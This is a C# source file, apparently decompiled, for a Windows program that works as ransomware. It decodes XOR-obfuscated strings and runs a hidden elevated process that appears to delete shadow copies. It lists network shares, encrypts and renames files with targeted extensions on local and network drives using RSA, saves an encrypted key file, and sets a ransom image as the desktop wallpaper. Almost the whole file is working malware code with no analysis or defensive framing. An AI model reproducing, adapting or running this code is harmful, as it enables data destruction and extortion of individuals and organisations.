using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using nekema.Properties;

namespace nekema;

public class Form1 : Form
{
	private byte X = 145;

	private int blocksize = 245;

	private int repeatCount = 3;

	private string publicKey = "";

	private string keyCode;

	private string keyfile = "";

	private string kfName = "";

	private string kfExt = "";

	private string pbK = "";

	private string privateKey = "";

	private List<string> SpecFolders = new List<string>();

	private List<string> extensions = new List<string>();

	private List<string> FullList = new List<string>();

	private string vNF = "";

	private static readonly int MAX_PATH = 260;

	private static readonly int SPI_GETDESKWALLPAPER = 115;

	private static readonly int SPI_SETDESKWALLPAPER = 20;

	private static readonly int SPIF_UPDATEINIFILE = 1;

	private static readonly int SPIF_SENDWININICHANGE = 2;

	private IContainer components = null;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	public Form1()
	{
		InitializeComponent();
		if (!FP())
		{
			Init();
		}
	}

	private bool FP()
	{
		bool result = false;
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processesByName = Process.GetProcessesByName(currentProcess.ProcessName);
		if (processesByName.Length > 1)
		{
			result = true;
		}
		return result;
	}

	private void SetDesktopWallpaper()
	{
		string lpvParam = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + vNF;
		SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, lpvParam, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
	}

	private void Init()
	{
		Prep();
		SaveNotes();
		GetDrives();
		NetScan();
		SetDesktopWallpaper();
	}

	private void DelS()
	{
		byte[] a = new byte[12]
		{
			231, 226, 226, 240, 245, 252, 248, 255, 191, 244,
			233, 244
		};
		byte[] a2 = new byte[26]
		{
			213, 244, 253, 244, 229, 244, 177, 194, 249, 240,
			245, 254, 230, 226, 177, 190, 208, 253, 253, 177,
			190, 192, 228, 248, 244, 229
		};
		Process process = new Process();
		process.StartInfo.FileName = DeXOR(a, X);
		process.StartInfo.Arguments = DeXOR(a2, X);
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.UseShellExecute = true;
		process.StartInfo.Verb = "runas";
		try
		{
			process.Start();
		}
		catch
		{
		}
	}

	private void PKI(int A)
	{
		PKK(A);
	}

	private void PKK(int Z)
	{
		double num = 0.0;
		for (int i = 0; i < Z; i++)
		{
			num = num * (double)Z + (double)(Z * Z);
		}
		num = num * (double)Z + (double)(Z * Z);
		num = num * (double)Z + (double)(Z * Z);
	}

	private void GetDrives()
	{
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				if (driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Network)
				{
					GetDirs(driveInfo.RootDirectory);
				}
			}
		}
		catch
		{
		}
	}

	private void GetDirs(DirectoryInfo pth)
	{
		try
		{
			DirectoryInfo[] directories = pth.GetDirectories();
			DirectoryInfo[] array = directories;
			foreach (DirectoryInfo directoryInfo in array)
			{
				GetFiles(directoryInfo);
				GetDirs(directoryInfo);
			}
		}
		catch
		{
		}
	}

	private void GetFiles(DirectoryInfo folder)
	{
		try
		{
			string[] files = Directory.GetFiles(folder.FullName, "*.*");
			string[] array = files;
			foreach (string text in array)
			{
				foreach (string extension in extensions)
				{
					if (text.ToLower().IndexOf(extension) > -1 && text.ToLower().IndexOf(extension + ".") == -1)
					{
						string f = text;
						if (text.IndexOf(vNF) == -1)
						{
							CF(f);
						}
					}
				}
			}
		}
		catch
		{
		}
	}

	private string DeXOR(byte[] A, int x)
	{
		string text = "";
		byte[] array = new byte[A.Length];
		for (int i = 0; i < A.Length; i++)
		{
			array[i] = (byte)(A[i] ^ x);
		}
		return text = Encoding.Default.GetString(array);
	}

	private void Prep()
	{
		byte[] a = new byte[8] { 226, 226, 245, 240, 191, 247, 240, 227 };
		byte[] a2 = new byte[32]
		{
			217, 222, 198, 188, 188, 197, 222, 188, 188, 195,
			212, 197, 196, 195, 223, 188, 188, 200, 222, 196,
			195, 188, 188, 215, 216, 221, 212, 194, 191, 251,
			225, 246
		};
		byte[] a3 = new byte[415]
		{
			173, 195, 194, 208, 218, 244, 232, 199, 240, 253,
			228, 244, 175, 173, 220, 254, 245, 228, 253, 228,
			226, 175, 186, 247, 215, 200, 248, 222, 168, 210,
			217, 168, 248, 203, 230, 230, 235, 253, 226, 192,
			162, 201, 186, 224, 203, 166, 196, 232, 233, 163,
			168, 161, 222, 249, 203, 160, 198, 231, 221, 229,
			167, 242, 252, 213, 245, 164, 254, 195, 226, 221,
			254, 217, 221, 255, 254, 214, 230, 226, 160, 210,
			198, 215, 220, 222, 214, 215, 251, 229, 243, 240,
			195, 222, 194, 250, 197, 246, 162, 198, 186, 166,
			163, 190, 197, 251, 235, 217, 250, 228, 193, 225,
			163, 198, 190, 195, 210, 166, 215, 211, 210, 165,
			219, 225, 246, 246, 228, 210, 248, 165, 233, 165,
			232, 244, 165, 217, 212, 230, 195, 250, 192, 166,
			164, 229, 217, 249, 248, 246, 161, 169, 249, 195,
			218, 252, 160, 240, 166, 230, 253, 230, 200, 253,
			169, 235, 221, 208, 235, 220, 169, 208, 230, 197,
			193, 221, 249, 166, 166, 161, 220, 222, 235, 193,
			224, 215, 160, 247, 219, 220, 218, 203, 210, 208,
			229, 245, 196, 246, 216, 218, 245, 200, 223, 208,
			250, 227, 193, 160, 169, 226, 195, 243, 226, 249,
			250, 214, 223, 251, 230, 251, 220, 249, 220, 221,
			223, 243, 218, 197, 240, 200, 247, 254, 162, 224,
			216, 194, 165, 231, 229, 199, 196, 192, 229, 242,
			230, 186, 246, 168, 232, 226, 162, 203, 215, 203,
			244, 229, 218, 212, 253, 161, 203, 220, 219, 212,
			225, 165, 201, 166, 243, 165, 217, 218, 168, 231,
			224, 196, 254, 249, 193, 211, 200, 247, 211, 226,
			235, 201, 200, 167, 248, 254, 255, 164, 252, 164,
			229, 194, 194, 247, 249, 219, 218, 167, 222, 201,
			163, 217, 193, 240, 196, 167, 195, 213, 242, 240,
			251, 197, 244, 212, 242, 252, 250, 168, 248, 229,
			168, 233, 166, 162, 245, 227, 219, 253, 244, 203,
			160, 214, 186, 229, 199, 246, 221, 167, 245, 228,
			221, 201, 190, 228, 222, 198, 193, 199, 232, 248,
			161, 227, 249, 232, 231, 200, 252, 195, 227, 214,
			223, 242, 216, 192, 172, 172, 173, 190, 220, 254,
			245, 228, 253, 228, 226, 175, 173, 212, 233, 225,
			254, 255, 244, 255, 229, 175, 208, 192, 208, 211,
			173, 190, 212, 233, 225, 254, 255, 244, 255, 229,
			175, 173, 190, 195, 194, 208, 218, 244, 232, 199,
			240, 253, 228, 244, 175
		};
		if (Environment.OSVersion.Version.Major > 5)
		{
			Thread thread = new Thread(DelS);
			thread.Start();
		}
		pbK = DeXOR(a3, X);
		string text = DeXOR(a2, X);
		vNF = DeXOR(a2, X);
		keyfile = DeXOR(a, X);
		kfExt = RetFExt(keyfile);
		kfName = RetFName(keyfile);
		keyCode = ".";
		Random random = new Random();
		random.Next(97, 122);
		for (int i = 0; i < 1; i++)
		{
			keyCode += Convert.ToChar(random.Next(97, 122));
		}
		keyCode = keyCode + (DateTime.Now.Day + 10) + Convert.ToChar(random.Next(97, 122)) + Convert.ToChar(random.Next(97, 122)) + Convert.ToChar(random.Next(97, 122)) + Convert.ToChar(random.Next(97, 122)) + (DateTime.Now.Month + 10) + Convert.ToChar(random.Next(97, 122));
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf("\\system"));
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		SpecFolders.Add(folderPath.ToLower());
		SpecFolders.Add(folderPath2.ToLower());
		SpecFolders.Add(DeXOR(new byte[8] { 195, 212, 210, 200, 210, 221, 212, 195 }, X));
		SpecFolders.Add(DeXOR(new byte[12]
		{
			181, 195, 212, 210, 200, 210, 221, 212, 191, 211,
			216, 223
		}, X));
		SpecFolders.Add(DeXOR(new byte[25]
		{
			194, 232, 226, 229, 244, 252, 177, 199, 254, 253,
			228, 252, 244, 177, 216, 255, 247, 254, 227, 252,
			240, 229, 248, 254, 255
		}, X));
		extensions.Add(DeXOR(new byte[3] { 191, 242, 245 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 253, 245, 247 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 252, 245, 247 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 252, 240, 233 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 245, 243, 247 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 244, 225, 247 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 160, 242, 245 }, X));
		extensions.Add(DeXOR(new byte[3] { 191, 252, 245 }, X));
		extensions.Add(DeXOR(new byte[3] { 191, 245, 243 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 225, 245, 247 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 225, 225, 229 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 233, 253, 226 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 245, 254, 242 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 240, 227, 251 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 229, 240, 227 }, X));
		extensions.Add(DeXOR(new byte[3] { 191, 166, 235 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 227, 240, 227 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 235, 248, 225 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 229, 248, 247 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 251, 225, 246 }, X));
		extensions.Add(DeXOR(new byte[3] { 191, 240, 248 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 243, 252, 225 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 225, 255, 246 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 242, 245, 227 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 225, 226, 245 }, X));
		extensions.Add(DeXOR(new byte[5] { 191, 251, 225, 244, 246 }, X));
		extensions.Add(DeXOR(new byte[5] { 191, 245, 254, 242, 233 }, X));
		extensions.Add(DeXOR(new byte[5] { 191, 233, 253, 226, 233 }, X));
		extensions.Add(DeXOR(new byte[5] { 191, 225, 225, 229, 233 }, X));
		extensions.Add(DeXOR(new byte[6] { 191, 240, 242, 242, 245, 243 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 252, 245, 243 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 227, 229, 247 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 254, 245, 229 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 254, 245, 226 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 254, 245, 243 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 254, 245, 246 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 242, 227, 163 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 255, 244, 247 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 255, 227, 247 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 254, 227, 247 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 240, 227, 230 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 226, 227, 163 }, X));
		extensions.Add(DeXOR(new byte[4] { 191, 226, 227, 247 }, X));
		List<string> list = new List<string>();
		Process process = new Process();
		process.StartInfo.FileName = "cmd";
		process.StartInfo.Arguments = "/C net view";
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		try
		{
			process.Start();
			string text2 = process.StandardOutput.ReadToEnd();
			int startIndex = 0;
			int num = 0;
			while (true)
			{
				startIndex = text2.IndexOf('\\', startIndex);
				if (startIndex == -1)
				{
					break;
				}
				num = text2.IndexOf(' ', startIndex);
				list.Add(text2.Substring(startIndex, num - startIndex));
				startIndex = num;
			}
		}
		catch
		{
		}
		for (int j = 0; j < list.Count; j++)
		{
			Process process2 = new Process();
			process2.StartInfo.FileName = "cmd";
			process2.StartInfo.Arguments = "/C net view " + list[j];
			process2.StartInfo.RedirectStandardOutput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = true;
			try
			{
				process2.Start();
				string s = process2.StandardOutput.ReadToEnd();
				byte[] bytes = Encoding.GetEncoding(1251).GetBytes(s);
				string @string = Encoding.GetEncoding("CP866").GetString(bytes);
				string[] array = @string.Split('\r', '\n');
				for (int k = 0; k < array.Length; k++)
				{
					if (array[k].IndexOf("Диск") > -1)
					{
						FullList.Add(list[j] + "\\" + array[k].Substring(0, array[k].IndexOf("Диск")));
					}
				}
			}
			catch
			{
			}
		}
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		publicKey = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
		privateKey = CryptKey(rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true));
	}

	private void CF(string f1)
	{
		byte[] array = new byte[blocksize];
		try
		{
			byte[] array2 = File.ReadAllBytes(f1);
			if (array2.Length / (repeatCount + 5) >= blocksize)
			{
				RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
				rSACryptoServiceProvider.FromXmlString(publicKey);
				byte[] array3 = new byte[array2.Length + repeatCount * 11];
				byte[] array4 = new byte[array2.Length - repeatCount * blocksize];
				for (int i = 0; i < repeatCount; i++)
				{
					Array.Copy(array2, blocksize * i, array, 0, blocksize);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
					Array.Copy(array5, 0, array3, i * (blocksize + 11), array5.Length);
				}
				Array.Copy(array2, repeatCount * blocksize, array4, 0, array4.Length);
				Array.Copy(array4, 0, array3, repeatCount * (blocksize + 11), array4.Length);
				try
				{
					File.WriteAllBytes(f1, array3);
					File.Move(f1, f1 + keyCode);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch
		{
		}
	}

	private void AddNote(string f)
	{
		string currentDirectory = Environment.CurrentDirectory;
		if (!(f != currentDirectory))
		{
			return;
		}
		try
		{
			if (!File.Exists(f + "\\" + vNF))
			{
				((Image)Resources.ne5).Save(f + "\\" + vNF);
			}
		}
		catch
		{
		}
	}

	private void NetScan()
	{
		for (int i = 0; i < FullList.Count; i++)
		{
			DirectoryInfo pth = new DirectoryInfo(FullList[i].ToString());
			GetDirs(pth);
		}
	}

	private void SaveNotes()
	{
		List<string> list = new List<string>();
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
		list.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		for (int i = 0; i < list.Count; i++)
		{
			SaveKey(list[i], privateKey);
			AddNote(list[i]);
		}
	}

	private void SaveKey(string f, string k)
	{
		string text = keyfile.Substring(0, keyfile.Length - 4);
		if (!File.Exists(f + "\\" + keyfile))
		{
			try
			{
				File.WriteAllText(f + "\\" + keyfile, k);
				return;
			}
			catch
			{
				return;
			}
		}
		try
		{
			File.WriteAllText(f + "\\" + text + AmountFiles(f) + "." + kfExt, k);
		}
		catch
		{
		}
	}

	private string RetFExt(string f)
	{
		int num = f.IndexOf('.');
		return f.Substring(num + 1, f.Length - num - 1);
	}

	private string RetFName(string f)
	{
		return f[..f.IndexOf('.')];
	}

	private int AmountFiles(string f)
	{
		int result = 0;
		try
		{
			string[] files = Directory.GetFiles(f, kfName + "*." + kfExt);
			result = files.Length;
		}
		catch
		{
		}
		return result;
	}

	private string CryptKey(string s)
	{
		string text = "";
		byte[] array = new byte[s.Length];
		byte[] array2 = new byte[blocksize];
		byte[] array3 = new byte[blocksize + 11];
		double num = Math.Ceiling((double)s.Length / (double)blocksize);
		if ((double)s.Length < num * (double)blocksize)
		{
			int length = s.Length;
			for (int i = 0; (double)i < num * (double)blocksize - (double)length; i++)
			{
				s += " ";
			}
		}
		array = Encoding.Default.GetBytes(s);
		Array.Reverse((Array)array);
		try
		{
			RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
			rSACryptoServiceProvider.FromXmlString(pbK);
			for (int j = 0; (double)j < num; j++)
			{
				Array.Copy(array, j * blocksize, array2, 0, blocksize);
				array3 = rSACryptoServiceProvider.Encrypt(array2, fOAEP: false);
				text += Encoding.Default.GetString(array3);
			}
		}
		catch
		{
		}
		return text;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		PKI(3);
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 261));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
